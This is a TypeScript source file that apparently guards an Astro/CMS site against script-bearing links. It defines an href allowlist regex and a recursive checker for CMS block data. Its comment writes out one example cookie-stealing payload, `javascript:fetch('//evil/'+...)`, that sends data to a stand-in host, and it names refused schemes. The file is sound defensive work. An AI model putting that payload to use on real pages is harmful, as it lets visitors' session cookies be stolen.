/**
 * What a link is allowed to point at.
 *
 * WHY THIS IS A SECURITY BOUNDARY AND NOT A TIDINESS CHECK
 *
 * Astro escapes an attribute value, so a CMS string in `href={...}` cannot
 * break out of its quotes. That is the whole of what escaping buys here, and
 * it is not enough: `javascript:fetch('//evil/'+document.cookie)` is a
 * perfectly well-formed attribute value that runs code when somebody clicks
 * it. The site's Content-Security-Policy carries `script-src 'unsafe-inline'`
 * — it has to, for Astro's pre-paint theme script — and `'unsafe-inline'` is
 * exactly the thing that permits a `javascript:` navigation. So CSP does not
 * catch this either.
 *
 * `check-links.mjs` does not catch it on its own: a `javascript:` URL is not
 * a path, so the resolver has nothing to look up. It is failed there
 * explicitly instead — see the scheme scan in that file.
 *
 * AND THE STUDIO SCHEMA IS NOT A BOUNDARY. `validation:` rules in
 * `studio/schemas/` run in the Studio UI only; the Content Lake API does not
 * enforce them, so any write token skips every one. That is the same argument
 * that moved the redirect checks into `integrations/redirects.mjs` and the
 * colour checks into `hexOrEmpty` — this is the third instance of it, and the
 * reason the check lives in `content.config.ts`, which runs on every build and
 * fails it.
 *
 * WHAT IS ON THE LIST
 *
 *   https:// http://  ordinary links
 *   mailto:  tel:     the two the footer and contact pages actually use
 *   /                 a path on this site
 *   #                 a fragment on the current page
 *
 * Everything else — `javascript:`, `data:`, `vbscript:`, a bare `file:` — is
 * refused. Anything genuinely needed can be added here deliberately; nothing
 * should ever be added under deadline pressure to make a build pass.
 *
 * The empty string is allowed because several fields use blank to mean "not
 * set" and drop the link entirely. Whether a field may be blank is each
 * schema's business, and none of them changed when this check arrived.
 *
 * `\/(?!\/)` RATHER THAN `\/`, which is not fussiness. A protocol-relative
 * `//evil.com` starts with a slash and reads as a path to anyone reviewing it
 * in the Studio, but the browser treats it as an absolute URL on another
 * origin and sends the visitor there. It cannot run a script, so it is not the
 * hole the rest of this file is about — it is just a link off the site wearing
 * a path's clothes, and there is no reason to accept one. A genuine external
 * link is written `https://`.
 */
export const SAFE_HREF = /^(https?:\/\/|mailto:|tel:|\/(?!\/)|#)/i;

/** Whether a value is safe to put in an `href`. Blank counts as safe. */
export const isSafeHref = (value: unknown): boolean =>
  typeof value === 'string' && (value === '' || SAFE_HREF.test(value));

/** The one wording every schema and every build error uses. */
export const UNSAFE_HREF_MESSAGE =
  'Use a path starting with / , a #fragment, a full http(s) URL, or a mailto:/tel: address.';

/**
 * The first unsafe href anywhere inside a value, as a dotted path, or null.
 *
 * For the block arrays on CMS-built pages, which are validated as
 * `.passthrough()` — what a section is allowed to CONTAIN cannot be pinned
 * down field by field without freezing the page builder, but "no link on this
 * page points at a script" is a rule that holds for every block that exists
 * and every block anybody adds later. So it is checked by walking the object
 * rather than by naming fields.
 *
 * Any key ending in `href`, at any depth, in any case.
 */
export function findUnsafeHref(value: unknown, path: string[] = []): string | null {
  if (Array.isArray(value)) {
    for (let i = 0; i < value.length; i++) {
      const found = findUnsafeHref(value[i], [...path, String(i)]);
      if (found) return found;
    }
    return null;
  }

  if (value && typeof value === 'object') {
    for (const [key, child] of Object.entries(value as Record<string, unknown>)) {
      if (typeof child === 'string' && /href$/i.test(key) && !isSafeHref(child)) {
        return [...path, key].join('.');
      }
      const found = findUnsafeHref(child, [...path, key]);
      if (found) return found;
    }
  }

  return null;
}
